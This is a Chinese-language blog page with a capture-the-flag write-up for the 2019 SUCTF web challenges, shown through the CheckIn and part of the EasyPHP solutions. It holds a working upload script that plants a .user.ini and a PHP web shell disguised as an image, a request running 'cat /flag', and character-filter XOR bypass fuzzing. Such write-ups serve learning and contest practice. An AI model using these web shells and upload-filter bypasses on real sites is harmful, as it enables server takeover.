@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="0x00 前言又是很嗨的一场比赛。 PS: 补充了iCloudMusic的个人详细题解 0x01 CheckIn题目描述http://47.111.59.243:9021 题目解答首先判断目标题目的容器环境，发现是nginx而不是apache 之后发现上传点具有如下特征：  .php 后缀的不可以 &amp;lt;? 不可以出现 exif_imagetype 检验是否是图片  那么就逐点bypass;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019 suctf writeup">
+<meta property="og:url" content="http://zer0yu.github.io/2019/09/05/2019-suctf-writeup/index.html">
+<meta property="og:site_name" content="Z3R0YU">
+<meta property="og:description" content="0x00 前言又是很嗨的一场比赛。 PS: 补充了iCloudMusic的个人详细题解 0x01 CheckIn题目描述http://47.111.59.243:9021 题目解答首先判断目标题目的容器环境，发现是nginx而不是apache 之后发现上传点具有如下特征：  .php 后缀的不可以 &amp;lt;? 不可以出现 exif_imagetype 检验是否是图片  那么就逐点bypass;">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2019/09/05/dBIaK6tqOmZuYrk.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/05/6hXeyQgimSRdZsj.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/05/M3W1296Pk87cBxh.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/05/NWG7hzBS68DRYrK.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/05/qJ12CDBzcX4fiK8.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/05/i7X39aKvsDqZryg.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/05/ApqTzZoxN7RFiPG.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/05/JMl7xh3vN9VO8dg.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/05/5aALED7ZmKgzOFW.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/05/pNoUHemk8gz65IC.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/05/c4YKaMtJT2G51Hx.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/05/uanreZOVpRiPd1f.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/05/WKvYDS6LZsNoEVJ.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/05/fKdHt4SpQmzAnle.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/05/Kr4mvRwXLbkIBeg.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/05/S7BDRxJkFsZygEf.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/05/QLyrleC4G7fSP2d.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/05/kWtoO7mvAxdwuLs.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/05/YPG87OgLlItiKo4.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/05/msHyRIeSvQ71Vki.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/05/7qYNs8JWiSdBPLA.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/05/ajvDxVtKH7Q4m5r.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/05/xnwBoXb1lgv93q7.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/05/Lw9j2aX8mvonHFu.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/05/CeHyOgw8f9QdzZq.png">
+<meta property="og:updated_time" content="2019-09-05T14:08:47.419Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019 suctf writeup">
+<meta name="twitter:description" content="0x00 前言又是很嗨的一场比赛。 PS: 补充了iCloudMusic的个人详细题解 0x01 CheckIn题目描述http://47.111.59.243:9021 题目解答首先判断目标题目的容器环境，发现是nginx而不是apache 之后发现上传点具有如下特征：  .php 后缀的不可以 &amp;lt;? 不可以出现 exif_imagetype 检验是否是图片  那么就逐点bypass;">
+<meta name="twitter:image" content="https://i.loli.net/2019/09/05/dBIaK6tqOmZuYrk.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>2019 suctf writeup</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Z3R0YU" type="application/atom+xml">
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2019/08/16/2019-8-15-writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2019/09/05/2019-suctf-writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2019/09/05/2019-suctf-writeup/&text=2019 suctf writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2019/09/05/2019-suctf-writeup/&title=2019 suctf writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2019/09/05/2019-suctf-writeup/&is_video=false&description=2019 suctf writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2019 suctf writeup&body=Check out this article: http://zer0yu.github.io/2019/09/05/2019-suctf-writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2019/09/05/2019-suctf-writeup/&title=2019 suctf writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2019/09/05/2019-suctf-writeup/&title=2019 suctf writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2019/09/05/2019-suctf-writeup/&title=2019 suctf writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2019/09/05/2019-suctf-writeup/&title=2019 suctf writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2019/09/05/2019-suctf-writeup/&name=2019 suctf writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-CheckIn"><span class="toc-number">2.</span> <span class="toc-text">0x01 CheckIn</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述"><span class="toc-number">2.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答"><span class="toc-number">2.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-EasyPHP"><span class="toc-number">3.</span> <span class="toc-text">0x02 EasyPHP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-1"><span class="toc-number">3.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-1"><span class="toc-number">3.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Pythonginx"><span class="toc-number">4.</span> <span class="toc-text">0x03 Pythonginx</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-2"><span class="toc-number">4.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-2"><span class="toc-number">4.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-easy-sql"><span class="toc-number">5.</span> <span class="toc-text">0x04 easy_sql</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-3"><span class="toc-number">5.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-3"><span class="toc-number">5.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-Upload-labs-2"><span class="toc-number">6.</span> <span class="toc-text">0x05 Upload labs 2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-4"><span class="toc-number">6.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-4"><span class="toc-number">6.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-Cocktail’s-Remix"><span class="toc-number">7.</span> <span class="toc-text">0x06 Cocktail’s Remix</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-5"><span class="toc-number">7.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-5"><span class="toc-number">7.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-iCloudMusic"><span class="toc-number">8.</span> <span class="toc-text">0x07 iCloudMusic</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-6"><span class="toc-number">8.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-6"><span class="toc-number">8.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-Game"><span class="toc-number">9.</span> <span class="toc-text">0x08 Game</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-7"><span class="toc-number">9.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-7"><span class="toc-number">9.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        2019 suctf writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Z3R0YU</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-09-05T13:47:20.000Z" itemprop="datePublished">2019-09-05</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>又是很嗨的一场比赛。</p>
+<p>PS: 补充了iCloudMusic的个人详细题解</p>
+<h2 id="0x01-CheckIn"><a href="#0x01-CheckIn" class="headerlink" title="0x01 CheckIn"></a>0x01 CheckIn</h2><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p><a href="http://47.111.59.243:9021" target="_blank" rel="noopener">http://47.111.59.243:9021</a></p>
+<h4 id="题目解答"><a href="#题目解答" class="headerlink" title="题目解答"></a>题目解答</h4><p>首先判断目标题目的容器环境，发现是nginx而不是apache</p>
+<p>之后发现上传点具有如下特征：</p>
+<ol>
+<li><code>.php</code> 后缀的不可以</li>
+<li><code>&lt;?</code> 不可以出现</li>
+<li><code>exif_imagetype</code> 检验是否是图片</li>
+</ol>
+<p>那么就逐点bypass;</p>
+<ol>
+<li><p>不允许php后缀的情况下就要考虑容器的特性<br>容器是否存在解析漏洞或者其他，如果是apache的话我们完全可以先上传<code>.htaccess</code>来将某个后缀当做php脚本解析执行，但是此处是nginx容器，在这个版本也没有对应的解析漏洞，因此考虑<code>.user.ini</code>来构造解析<br>这个可以参考：<a href="https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html" target="_blank" rel="noopener">《user.ini文件构成的PHP后门》</a></p>
+</li>
+<li><p>不允许<code>&lt;?</code> 那么就考虑<code>&lt;script language=&#39;php&#39;&gt;</code></p>
+</li>
+<li><code>exif_imagetype</code> 校验bypass<br>这个可以参考这篇文章：<a href="https://xz.aliyun.com/t/3937" target="_blank" rel="noopener">https://xz.aliyun.com/t/3937</a></li>
+</ol>
+<p>最终得到如下getshell脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://47.111.59.243:9021/"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b"""\x00\x00\x8a\x39\x8a\x39</span></span><br><span class="line"><span class="string">auto_prepend_file = cc.jpg</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shell = b"\x00\x00\x8a\x39\x8a\x39"+b"00"+ base64.b64encode(b"&lt;?php eval($_GET['c']);?&gt;")</span></span><br><span class="line">shell =  <span class="string">b"\x00\x00\x8a\x39\x8a\x39"</span>+<span class="string">b"00"</span> + <span class="string">"&lt;script language='php'&gt;eval($_REQUEST[c]);&lt;/script&gt;"</span></span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'fileUpload'</span>,(<span class="string">'.user.ini'</span>,htaccess,<span class="string">'image/jpeg'</span>))]</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"upload"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line">print(<span class="string">"upload .user.ini"</span>)</span><br><span class="line">r = requests.post(url=url, data=data, files=files)<span class="comment">#proxies=proxies)</span></span><br><span class="line"></span><br><span class="line">print(r.text) </span><br><span class="line"></span><br><span class="line">print(<span class="string">"upload cc.jpg"</span>)</span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'fileUpload'</span>,(<span class="string">'cc.jpg'</span>,shell,<span class="string">'image/jpeg'</span>))]</span><br><span class="line">r = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /uploads/0ec1db6cfe0333559b8991ce81e48662/index.php?c=system(%27cat%20/flag%27); HTTP/1.1</span><br><span class="line">Host: 47.111.59.243:9021</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-Modified-Since: Sat, 17 Aug 2019 02:28:39 GMT</span><br><span class="line">If-None-Match: &quot;5d576657-74&quot;</span><br></pre></td></tr></table></figure>
+<p>直接cat得到flag<br><img src="https://i.loli.net/2019/09/05/dBIaK6tqOmZuYrk.png" alt="CDE4B672-51B6-4029-B4F6-12E88C73D62D.png"></p>
+<h2 id="0x02-EasyPHP"><a href="#0x02-EasyPHP" class="headerlink" title="0x02 EasyPHP"></a>0x02 EasyPHP</h2><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p><a href="http://47.111.59.243:9001/" target="_blank" rel="noopener">http://47.111.59.243:9001/</a></p>
+<h4 id="题目解答-1"><a href="#题目解答-1" class="headerlink" title="题目解答"></a>题目解答</h4><p>访问站点直接得到网站对应的源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>看到源码之后思路就很明确了，<code>get_the_flag</code> 函数部分的上传漏洞和上题相类似，但是不同的是这里是<code>apache</code>环境，所以要上传的是<code>.htaccess</code>文件来构造解析。</p>
+<p>关键的是第一部分，如何来让<code>eval</code> 函数触发<code>get_the_flag</code> 函数，首先判断正则过滤了那些ascii字符，写一个脚本判断一下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$unfilter_str = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($ascii = <span class="number">0</span>; $ascii &lt; <span class="number">256</span>; $ascii++) &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, chr($ascii))) &#123;</span><br><span class="line">		$unfilter_str[] = urlencode(chr($ascii));</span><br><span class="line">	&#125;</span><br><span class="line">print_r(<span class="string">'\''</span> . implode(<span class="string">'\',\''</span>, $unfilter_str) . <span class="string">'\''</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>最终可以得到有如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&apos;%21&apos;,&apos;%23&apos;,&apos;%24&apos;,&apos;%25&apos;,&apos;%28&apos;,&apos;%29&apos;,&apos;%2A&apos;,&apos;%2B&apos;,&apos;-&apos;,&apos;%2F&apos;,&apos;%3A&apos;,&apos;%3B&apos;,&apos;%3C&apos;,&apos;%3E&apos;,&apos;%3F&apos;,&apos;%40&apos;,&apos;%5C&apos;,&apos;%5D&apos;,&apos;%5E&apos;,&apos;%7B&apos;,&apos;%7D&apos;,&apos;%80&apos;,&apos;%81&apos;,&apos;%82&apos;,&apos;%83&apos;,&apos;%84&apos;,&apos;%85&apos;,&apos;%86&apos;,&apos;%87&apos;,&apos;%88&apos;,&apos;%89&apos;,&apos;%8A&apos;,&apos;%8B&apos;,&apos;%8C&apos;,&apos;%8D&apos;,&apos;%8E&apos;,&apos;%8F&apos;,&apos;%90&apos;,&apos;%91&apos;,&apos;%92&apos;,&apos;%93&apos;,&apos;%94&apos;,&apos;%95&apos;,&apos;%96&apos;,&apos;%97&apos;,&apos;%98&apos;,&apos;%99&apos;,&apos;%9A&apos;,&apos;%9B&apos;,&apos;%9C&apos;,&apos;%9D&apos;,&apos;%9E&apos;,&apos;%9F&apos;,&apos;%A0&apos;,&apos;%A1&apos;,&apos;%A2&apos;,&apos;%A3&apos;,&apos;%A4&apos;,&apos;%A5&apos;,&apos;%A6&apos;,&apos;%A7&apos;,&apos;%A8&apos;,&apos;%A9&apos;,&apos;%AA&apos;,&apos;%AB&apos;,&apos;%AC&apos;,&apos;%AD&apos;,&apos;%AE&apos;,&apos;%AF&apos;,&apos;%B0&apos;,&apos;%B1&apos;,&apos;%B2&apos;,&apos;%B3&apos;,&apos;%B4&apos;,&apos;%B5&apos;,&apos;%B6&apos;,&apos;%B7&apos;,&apos;%B8&apos;,&apos;%B9&apos;,&apos;%BA&apos;,&apos;%BB&apos;,&apos;%BC&apos;,&apos;%BD&apos;,&apos;%BE&apos;,&apos;%BF&apos;,&apos;%C0&apos;,&apos;%C1&apos;,&apos;%C2&apos;,&apos;%C3&apos;,&apos;%C4&apos;,&apos;%C5&apos;,&apos;%C6&apos;,&apos;%C7&apos;,&apos;%C8&apos;,&apos;%C9&apos;,&apos;%CA&apos;,&apos;%CB&apos;,&apos;%CC&apos;,&apos;%CD&apos;,&apos;%CE&apos;,&apos;%CF&apos;,&apos;%D0&apos;,&apos;%D1&apos;,&apos;%D2&apos;,&apos;%D3&apos;,&apos;%D4&apos;,&apos;%D5&apos;,&apos;%D6&apos;,&apos;%D7&apos;,&apos;%D8&apos;,&apos;%D9&apos;,&apos;%DA&apos;,&apos;%DB&apos;,&apos;%DC&apos;,&apos;%DD&apos;,&apos;%DE&apos;,&apos;%DF&apos;,&apos;%E0&apos;,&apos;%E1&apos;,&apos;%E2&apos;,&apos;%E3&apos;,&apos;%E4&apos;,&apos;%E5&apos;,&apos;%E6&apos;,&apos;%E7&apos;,&apos;%E8&apos;,&apos;%E9&apos;,&apos;%EA&apos;,&apos;%EB&apos;,&apos;%EC&apos;,&apos;%ED&apos;,&apos;%EE&apos;,&apos;%EF&apos;,&apos;%F0&apos;,&apos;%F1&apos;,&apos;%F2&apos;,&apos;%F3&apos;,&apos;%F4&apos;,&apos;%F5&apos;,&apos;%F6&apos;,&apos;%F7&apos;,&apos;%F8&apos;,&apos;%F9&apos;,&apos;%FA&apos;,&apos;%FB&apos;,&apos;%FC&apos;,&apos;%FD&apos;,&apos;%FE&apos;,&apos;%FF&apos;]</span><br></pre></td></tr></table></figure></p>
+<p>那么之后只要使用既有的规则模式进行fuzz即可（随后会写专门的文章来介绍webfuzz）</p>
+<p>因为还有长度限制，所以如果fuzz出<code>get_the_flag</code>的话，可能长度会超，所以考虑率fuzz出<code>$_GET[z]</code>，然后让php解析<code>${$_GET[z]}</code>来达到调用对应函数的目的。</p>
+<p>这里fuzz字符之间的异或，最终得到如下结果<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="comment">// fuzz_api.php</span></span><br><span class="line">$_=$_GET[<span class="string">'a'</span>]^$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="comment">// $_ = '%fe%fe%fe%fe^%a1%b9%bb%aa';</span></span><br><span class="line"><span class="keyword">if</span>($_ == <span class="string">'_GET'</span>)print_r(<span class="string">'true'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>因为可见字符都被过滤了，这里我们还得要一个字符来作为参数，同时要考虑bypass<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br></pre></td></tr></table></figure></p>
